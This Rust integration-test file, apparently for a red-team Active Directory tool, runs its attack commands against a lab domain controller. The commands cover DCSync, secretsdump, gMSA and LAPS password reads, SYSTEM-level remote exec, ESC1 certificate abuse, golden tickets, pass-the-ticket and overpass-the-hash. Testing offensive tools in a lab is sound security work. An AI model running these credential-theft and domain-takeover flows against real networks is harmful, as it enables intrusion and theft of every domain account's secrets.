//! Live integration tests against a real DC — the regression net for the offensive flows that
//! unit tests can't cover. All are `#[ignore]`d so the normal `cargo test` stays hermetic; run
//! them explicitly against a lab:
//!
//!   ADH_DC=10.0.0.1 ADH_DOMAIN=CORP ADH_REALM=CORP.LOCAL \
//!   ADH_USER=Administrator ADH_PASS='...' cargo test -p adhammer --test integration -- --ignored --test-threads=1
//!
//! Optional per-test gates (a test skips cleanly if its env is unset): `ADH_CA` (enum esc),
//! `ADH_NETBIOS` (zerologon detect), `ADH_KRBTGT_AES256` + `ADH_DOMAIN_SID` + `ADH_SPN`
//! (golden/pth), `ADH_OPTH_USER` + `ADH_OPTH_HASH` (overpass-the-hash).
//!
//! Use `--test-threads=1`: these share one DC and the SVCCTL-exec tests churn services rapidly,
//! so running them concurrently can race the detached-exec output read.
//!
//! Each asserts a known-good outcome (e.g. krbtgt hash is 32 hex, exec returns SYSTEM), so a
//! regression in DCSync/exec/SAMR/secretsdump/ESC1/esc/posture/zerologon fails the run instead of
//! silently shipping. This is the reproducible backing for the legacy-DC matrix.

use std::process::Command;

fn env(k: &str) -> Option<String> {
    std::env::var(k).ok().filter(|v| !v.is_empty())
}

/// Run the built `adhammer` binary with args; return combined stdout+stderr. Returns None when
/// the lab env isn't configured (so the test is skipped rather than failing).
fn run(args: &[&str]) -> Option<String> {
    env("ADH_DC")?; // gate: no lab configured
    let bin = env!("CARGO_BIN_EXE_adhammer");
    // A spawn failure (e.g. a sandboxed/locked-down host) skips rather than false-fails.
    let out = Command::new(bin).args(args).output().ok()?;
    Some(format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    ))
}

fn dc() -> String {
    env("ADH_DC").unwrap()
}
fn domain() -> String {
    env("ADH_DOMAIN").unwrap_or_else(|| "CORP".into())
}
fn user() -> String {
    env("ADH_USER").unwrap_or_else(|| "Administrator".into())
}
fn pass() -> String {
    env("ADH_PASS").unwrap_or_default()
}

#[test]
#[ignore = "live DC"]
fn dcsync_krbtgt_returns_nt_hash() {
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--target",
        "krbtgt",
    ]) else {
        return;
    };
    let line = o
        .lines()
        .find(|l| l.starts_with("krbtgt:"))
        .expect("krbtgt line");
    let nt = line.split(':').nth(3).unwrap_or("");
    assert_eq!(nt.len(), 32, "krbtgt NT hash must be 32 hex: {line}");
    assert!(nt.chars().all(|c| c.is_ascii_hexdigit()));
    // Kerberos-key extraction: the krbtgt AES256 key (golden-ticket key) must be present,
    // 64 hex chars, on its own `krbtgt:aes256-cts-hmac-sha1-96:<key>` line.
    let aes = o
        .lines()
        .find(|l| l.starts_with("krbtgt:aes256-cts-hmac-sha1-96:"))
        .and_then(|l| l.rsplit(':').next())
        .expect("krbtgt aes256 key line");
    assert_eq!(aes.len(), 64, "krbtgt AES256 key must be 64 hex: {aes}");
    assert!(aes.chars().all(|c| c.is_ascii_hexdigit()));
}

#[test]
#[ignore = "live DC"]
fn samr_enumerates_users() {
    let Some(o) = run(&[
        "enum",
        "samr",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
    ]) else {
        return;
    };
    assert!(o.contains("SAMR users"), "expected SAMR user listing:\n{o}");
    assert!(o.contains("Administrator"));
}

#[test]
#[ignore = "live DC"]
fn exec_runs_as_system() {
    let Some(o) = run(&[
        "attack",
        "exec",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "exec should run as SYSTEM:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn secretsdump_dumps_machine_and_sam() {
    let Some(o) = run(&[
        "attack",
        "secretsdump",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
    ]) else {
        return;
    };
    // SYSTEM hive must always be pulled (required for bootkey).
    assert!(o.contains("SYSTEM "), "should pull the SYSTEM hive:\n{o}");
    // Then either the protected hives decrypt (permissive host) OR the tool degrades gracefully
    // (a hardened DC can deny `reg save` of SAM/SECURITY even to LocalSystem).
    let dumped = o.contains("Administrator:500:") || o.contains("$MACHINE.ACC:");
    let degraded = o.contains("unavailable");
    assert!(
        dumped || degraded,
        "secretsdump should dump SAM/LSA or report the hive unavailable:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn gmsa_read_returns_nt_hash() {
    let url = format!("ldaps://{}:636", dc());
    let target = env("ADH_GMSA").unwrap_or_else(|| "gmsa_web$".into());
    // LDAPS simple bind needs a qualified name (DOMAIN\user), unlike the NTLM commands.
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "attack",
        "gmsa",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
        "--target",
        &target,
    ]) else {
        return;
    };
    // gmsa_web$:aad3b435...:<nt>:::  — assert a 32-hex NT hash came back.
    // gMSA line is `sam:LM:NT:::` (no RID field, unlike dcsync) → NT hash at index 2.
    let line = o.lines().find(|l| l.contains(&target)).expect("gmsa line");
    let nt = line.split(':').nth(2).unwrap_or("");
    assert_eq!(nt.len(), 32, "gMSA NT hash must be 32 hex: {line}");
}

#[test]
#[ignore = "live DC"]
fn laps_reads_cleartext() {
    // Needs a computer with a readable LAPS password: set ADH_LAPS_TARGET=<HOST$>.
    // Optionally ADH_LAPS_EXPECT=<password substring> to assert the exact value.
    let Some(target) = env("ADH_LAPS_TARGET") else {
        return;
    };
    let url = format!("ldaps://{}:636", dc());
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "attack",
        "laps",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
        "--target",
        &target,
    ]) else {
        return;
    };
    // Output is `HOST$<TAB>account<TAB>password`; assert the host line came back with a value.
    let line = o.lines().find(|l| l.contains(&target)).expect("laps line");
    let pw = line.split('\t').nth(2).unwrap_or("");
    assert!(!pw.is_empty(), "no cleartext LAPS password parsed: {line}");
    if let Some(expect) = env("ADH_LAPS_EXPECT") {
        assert!(
            pw.contains(&expect),
            "LAPS password {pw} != expected {expect}"
        );
    }
}

#[test]
#[ignore = "live DC"]
fn winrm_runs_command() {
    // WinRM must be enabled on the target (5985) and the user must be allowed to remote in.
    let Some(o) = run(&[
        "attack",
        "winrm",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.contains("WinRM shell opened"),
        "no WinRM shell established:\n{o}"
    );
    assert!(
        o.to_lowercase().contains(&user().to_lowercase()),
        "whoami over WinRM should echo the user:\n{o}"
    );
    assert!(o.contains("exited 0"), "expected clean exit:\n{o}");
}

#[test]
#[ignore = "live DC"]
fn dns_enumerates_adidns() {
    let url = format!("ldaps://{}:636", dc());
    let bind_user = format!("{}\\{}", domain(), user());
    let Some(o) = run(&[
        "enum",
        "dns",
        "--url",
        &url,
        "--user",
        &bind_user,
        "--password",
        &pass(),
        "--insecure",
    ]) else {
        return;
    };
    // A live DC always self-registers SRV records for its own services under its zone.
    assert!(
        o.contains("ADIDNS:"),
        "expected the ADIDNS summary line:\n{o}"
    );
    assert!(
        o.contains("SRV") && o.contains("_ldap._tcp"),
        "expected the DC's LDAP SRV records:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn esc1_enrolls_certificate() {
    // CA + vulnerable template + realm are lab-specific — configure via env, don't hardcode.
    let Some(ca) = env("ADH_CA") else { return };
    let template = env("ADH_TEMPLATE").unwrap_or_else(|| "User".into());
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let upn = format!("{}@{}", user(), realm.to_lowercase());
    let out = std::env::temp_dir().join("adh_it.crt");
    let Some(o) = run(&[
        "attack",
        "esc1",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--ca",
        &ca,
        "--template",
        &template,
        "--upn",
        &upn,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(
        o.contains("certificate ISSUED"),
        "CA should issue a cert:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn constrained_delegation_s4u() {
    // Requires a lab account with msDS-AllowedToDelegateTo + protocol transition.
    let (acct, pw, spn) = match (
        env("ADH_DELEG_ACCT"),
        env("ADH_DELEG_PASS"),
        env("ADH_DELEG_SPN"),
    ) {
        (Some(a), Some(p), Some(s)) => (a, p, s),
        _ => return, // not configured
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let Some(o) = run(&[
        "attack",
        "constrained",
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--account",
        &acct,
        "--account-password",
        &pw,
        "--impersonate",
        "Administrator",
        "--target-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("service ticket") || o.contains("succeeded"),
        "S4U chain should yield a ticket:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn dcsync_all_dumps_domain() {
    let Some(o) = run(&[
        "attack",
        "dcsync",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pass(),
        "--all",
    ]) else {
        return;
    };
    assert!(o.contains("krbtgt:502:"));
    assert!(o.contains("Administrator:500:"));
    assert!(o.contains("full-domain DCSync complete"));
}

#[test]
#[ignore = "live DC"]
fn golden_ticket_accepted() {
    // Extra gate: needs the krbtgt AES256 key + domain SID (from a prior dcsync).
    let (Some(key), Some(sid)) = (env("ADH_KRBTGT_AES256"), env("ADH_DOMAIN_SID")) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    // Prefer an explicit ADH_SPN, else derive from the DC name (ADH_NETBIOS), else the old default.
    let spn = env("ADH_SPN").unwrap_or_else(|| {
        let host = env("ADH_NETBIOS").unwrap_or_else(|| "dc01".into());
        format!("cifs/{}.{}", host.to_lowercase(), realm.to_lowercase())
    });
    let Some(o) = run(&[
        "attack",
        "golden",
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--krbtgt-aes256",
        &key,
        "--domain-sid",
        &sid,
        "--verify-spn",
        &spn,
    ]) else {
        return;
    };
    assert!(
        o.contains("KDC accepted the golden ticket"),
        "golden ticket not accepted: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn pass_the_ticket_golden_exec() {
    let (Some(key), Some(sid), Some(spn)) = (
        env("ADH_KRBTGT_AES256"),
        env("ADH_DOMAIN_SID"),
        env("ADH_SPN"),
    ) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let Some(o) = run(&[
        "attack",
        "pth",
        "--host",
        &dc(),
        "--kdc",
        &dc(),
        "--realm",
        &realm,
        "--domain-sid",
        &sid,
        "--krbtgt-aes256",
        &key,
        "--spn",
        &spn,
        "--command",
        "whoami",
    ]) else {
        return;
    };
    assert!(
        o.contains("Kerberos SMB session established"),
        "no PtT session: {o}"
    );
    assert!(
        o.to_lowercase().contains("nt authority\\system"),
        "golden PtT did not run as SYSTEM: {o}"
    );
}

#[test]
#[ignore = "live DC"]
fn overpass_the_hash_gets_tgt() {
    // RC4-HMAC overpass-the-hash: NT hash → TGT. Needs ADH_OPTH_USER + ADH_OPTH_HASH (32 hex).
    let (Some(user), Some(hash)) = (env("ADH_OPTH_USER"), env("ADH_OPTH_HASH")) else {
        return;
    };
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let out = std::env::temp_dir().join("adh_optt.ccache");
    let Some(o) = run(&[
        "attack",
        "asktgt",
        "--user",
        &user,
        "--realm",
        &realm,
        "--kdc",
        &dc(),
        "--nt-hash",
        &hash,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(o.contains("TGT obtained"), "overpass-the-hash failed:\n{o}");
}

#[test]
#[ignore = "live DC"]
fn enum_esc_registry_checks() {
    // ESC6/7/10/11/16 over MS-RRP. Needs the CA name (ADH_CA) and Remote Registry running.
    let Some(ca) = env("ADH_CA") else { return };
    let pw = pass();
    let Some(o) = run(&[
        "enum",
        "esc",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pw,
        "--ca",
        &ca,
    ]) else {
        return;
    };
    // A valid run either reaches the registry and lists ESC hits, or cleanly reports none —
    // both prove the SMB → \winreg → decision path works end to end.
    assert!(
        o.contains("Remote Registry reachable"),
        "enum esc did not reach the registry:\n{o}"
    );
    assert!(
        o.contains("A-Esc") || o.contains("no registry-based ESC"),
        "enum esc produced no verdict:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn enum_posture_relay_enablers() {
    // LDAP signing / channel binding + Spooler over MS-RRP.
    let pw = pass();
    let Some(o) = run(&[
        "enum",
        "posture",
        "--host",
        &dc(),
        "--domain",
        &domain(),
        "--user",
        &user(),
        "--password",
        &pw,
    ]) else {
        return;
    };
    assert!(
        o.contains("A-Ldap") || o.contains("A-SpoolerOnDc") || o.contains("no relay/coercion"),
        "enum posture produced no verdict:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn zerologon_detect_reports_verdict() {
    // SAFE detection only (never resets the machine password). Needs the DC NetBIOS name.
    let Some(netbios) = env("ADH_NETBIOS") else {
        return;
    };
    let Some(o) = run(&[
        "attack",
        "zerologon",
        "--host",
        &dc(),
        "--netbios",
        &netbios,
    ]) else {
        return;
    };
    assert!(
        o.contains("VULNERABLE to Zerologon") || o.contains("not vulnerable to Zerologon"),
        "zerologon probe gave no verdict:\n{o}"
    );
}

#[test]
#[ignore = "live DC"]
fn asktgt_returns_ccache() {
    // Password → TGT, exercising the AES path (and the RC4 fallback for AES-keyless accounts).
    let pw = pass();
    if pw.is_empty() {
        return;
    }
    let realm = env("ADH_REALM").unwrap_or_else(|| "CORP.LOCAL".into());
    let out = std::env::temp_dir().join("adh_asktgt.ccache");
    let Some(o) = run(&[
        "attack",
        "asktgt",
        "--user",
        &user(),
        "--realm",
        &realm,
        "--kdc",
        &dc(),
        "--password",
        &pw,
        "--out",
        out.to_str().unwrap(),
    ]) else {
        return;
    };
    assert!(o.contains("TGT obtained"), "asktgt failed:\n{o}");
}
